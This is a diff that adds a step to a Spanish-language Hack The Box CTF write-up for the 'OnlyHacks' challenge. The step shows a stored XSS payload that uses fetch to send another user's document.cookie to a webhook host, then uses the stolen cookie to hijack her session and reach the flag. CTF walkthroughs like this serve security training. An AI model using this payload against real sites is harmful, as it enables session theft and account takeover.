@@ -52,4 +52,18 @@ Para comprobarlo vamos a usar [WebHook](https://webhook.site) para usarlo como s
 
 ![](/assets/images/hackthebox/challenges/onlyhacks/9.png)
 
-👀
+👀, vemos que el navegador de Renata ejecuta el código JavScript indicado. Ahora en el payload vamos a añadir `document.cookie` para robarle la sesión e iniciar como ella en la aplicación web:
+```html
+<script>fetch("tu-sitio-webhook"+document.cookie)</script>
+```
+
+![](/assets/images/hackthebox/challenges/onlyhacks/10.png)
+
+Bien!! Ya tenemos las cookies 🍪 de Renata, ahora vamos a cambiarlas en las `DevTools` de Firefox:
+
+![](/assets/images/hackthebox/challenges/onlyhacks/11.png)
+
+Ahora `ctrl+r` y veremos que tenemos otros chats y tenemos un chat con `Dimitris` donde se encuentra la flag:
+
+![](/assets/images/hackthebox/challenges/onlyhacks/12.png)
+---
